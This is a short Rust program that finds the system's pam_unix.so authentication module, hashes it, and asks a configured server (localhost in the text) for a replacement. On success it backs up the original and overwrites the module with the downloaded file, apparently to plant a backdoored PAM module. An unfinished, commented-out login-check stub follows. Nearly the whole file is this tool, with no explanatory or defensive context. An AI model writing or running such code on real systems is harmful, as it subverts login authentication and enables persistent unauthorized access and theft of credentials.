use md5::compute;
use reqwest;
use std::fs;
use std::io;
use std::process::Command;
use std::str::from_utf8;

const HOST: &str = "http://localhost/";

fn main() {
    let pam_path = get_pam();
    let digest = compute(fs::read(&pam_path).expect("Unable to read file."));

    let mut resp = reqwest::blocking::get(&format!("{}{:x}", HOST, digest))
        .expect(&format!("Request to {} failed.", HOST));

    match resp.status() {
        reqwest::StatusCode::OK => {
            fs::copy(&pam_path, &format!("{}.bak", &pam_path))
            	.expect("Failed to create backup.");
            let mut out = fs::File::create(&pam_path)
            	.expect("Failed to create file.");
            io::copy(&mut resp, &mut out)
            	.expect("Failed to copy content.");
        }
        reqwest::StatusCode::NOT_FOUND => {
            println!("{:x}: not found on server.", digest);
        }
        _ => (),
    }
}

fn get_pam() -> String {
    let output = Command::new("sh")
        .arg("-c")
        .arg("find / -name pam_unix.so -print 2>/dev/null")
        .output()
        .expect("Failed to execute process");

    let path = from_utf8(&output.stdout)
        .unwrap()
        .lines()
        .collect::<Vec<&str>>();
    path.last().expect("pam_unix.so not found!").to_string()
}

/*
fn check_login(password: String) -> bool {
    let output = Command::new("/bin/login")
        .arg("")
        .
}
*/
